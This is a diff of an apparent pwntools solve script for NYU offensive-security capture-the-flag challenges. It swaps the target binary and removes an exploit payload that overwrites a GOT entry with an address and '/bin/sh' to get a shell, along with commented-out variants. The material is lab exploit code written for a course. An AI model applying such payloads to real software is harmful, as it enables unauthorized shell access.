@@ -4,30 +4,21 @@ import re
 #outside imports
 from pwn import *
 
-
 #used for pulling the flag from output
 flag_regex = r"flag\{[^}]+\}"
 global_timeout = 5 #seconds
 
 #challenge-specific info
 host = 'offsec-chalbroker.osiris.cyber.nyu.edu'
-port = 1341
+port = 1246
 netid='pk1898'
 
-# context.log_level ='debug'
 do_remote = False
-binary_name = './git_got_good'
-e = ELF('./git_got_good')
+binary_name = './inspector'
 
 #for doing local debugging
-is_local_dbg = True
+is_local_dbg = False
 gdb_script = '''
-set follow-fork-mode parent
-set detach-on-fork on
-b main
-b fgets
-b puts
-b *0x4007de
 c
 '''
 
@@ -37,40 +28,12 @@ def find_flag(input):
     if(m != []):
         return m[0]
     else:
-        return
+        return None
 
 
 def solve(target):
-    print target.recvuntil("save:")
-    DATA = ''
-    #DATA += p64(e.got['system'])
-    # DATA += p64(e.got['__libc_start_main']+0x262418)
-    #DATA += p64(0xf1147)
-
-
-    DATA += p64(0x0040074b)
-    DATA += '/bin/sh '
-    DATA += p64(e.got['puts'])
-
-
-
-    # DATA += 'AAAAAAAA'
-    # DATA += '/bin/sh '
-
-    # DATA += "cat flag.txt"
-
-    print DATA
-
-    #DATA += p64(0x004005d0)
-    #DATA = p64(0x004007a8)
-    #DATA += "cat flag.txt"
-    #DATA = "hi"
-    print target.send(DATA)
     print target.readline()
-    print target.readline()
-    #target.sendline('cat flag.txt')
-    target.interactive()
-    return target.readline()
+    return None
 
 
 #universal target setup for remote-only
